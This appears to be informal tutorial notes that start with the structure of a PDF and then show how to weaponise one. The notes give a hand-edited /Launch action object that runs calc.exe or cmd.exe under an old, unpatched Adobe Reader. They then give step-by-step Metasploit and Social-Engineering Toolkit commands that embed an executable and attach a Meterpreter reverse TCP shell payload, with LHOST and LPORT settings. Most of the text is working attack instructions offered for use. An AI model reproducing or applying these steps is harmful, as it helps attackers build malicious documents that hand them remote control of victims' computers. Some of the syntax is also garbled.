# Structure of a PDF
 1. Header
 2. Body
 3. Cross reference table
 4. Trailer
 
 1. Header = indicated in green, start with ( %PDF-1.1 ), versions may vary from ( 1.0 to 1.7 ).
 2. Body   = all the objects,name,etc.... are located.
 3. Cross Reference Table = indicated in purple, highly defined structure and specifics, where an object is located in a PDF document.
 4. Trailer = always being from ( %%EOF ) as PDFs. start reading from (%%EOF) & it will jump  and start to locate the line ( "Start Xref" ).
          First Download Adobe Reader 9.3.2 as the launch action is not patched. you can download from - oldapps.com
   open blank pdf on notepad  or  wordpad.     
          
          When you open the pdf on notepad at top we see the (%PDF-1.6)
          Next scroll down the file find the name object section the section would start from ..
          eg :- 5 0 obj
                <<
                 /length 500
                >>
          next add the following line replacing  <length 500.  to endstream
          /Type/Action 
          /S/Lau
          /Win
          <<
          /F (calc.exe)
              
              here is how it will look
              108 0 obj
              <<
               /Type /Action 
               /S /Launch 
               /win
               <<
                /F (calc.exe)
               >>
              >>
              endobj
              
   /S = this parameter defines the type of action that should be performed. in this case it's /launch.
  /Win = this define that the operating system on which we will execute it is windows, which becomes /Mac if the OS is Mac and /unix if you are executing it on a          linux system.
  /F = this parameter defines what type of application should run. in this case it's calc.exe, which will launch the calculator when executed.
    /F (cmd.exe)

# Adobe PDF Embedded EXE
 1. msfconsole
 2. use exploit/windows/fileformat/adobe_pdf_embedded_exe
 3. show options, change file name, we also see that the "INFILENAME" is. required so we need a blank PDF file in. Which it will embed the exe. you can use any PDF   file you want.
 4. also we can set LAUNCH_Message <message>
 5.once you complete exploit part. now set payload =
 set payload windows/meterpreter/reverse_tcp
 6. now set LHOST & LPORT
 7. then type "exploit" & it will generate your malicious PDF. 
 8. it will save the PDF file in the /root/.msf4/local/     directory.

 1.  Social engineering toolkit
 2.  Social-Engineering Attacks
 3.  Infectious Media Generator
 4.  File-Format Exploits
 5.  now my ip
 6.  Adobe PDF Embedded EXE Social Engineering
 7.  Use built-in BLANK PDF for attack
 8.  Windows Reverse TCP Shell
 9.  LHOST enter
 10. LPORT 4444
 11. it will ask you yes/no     yes
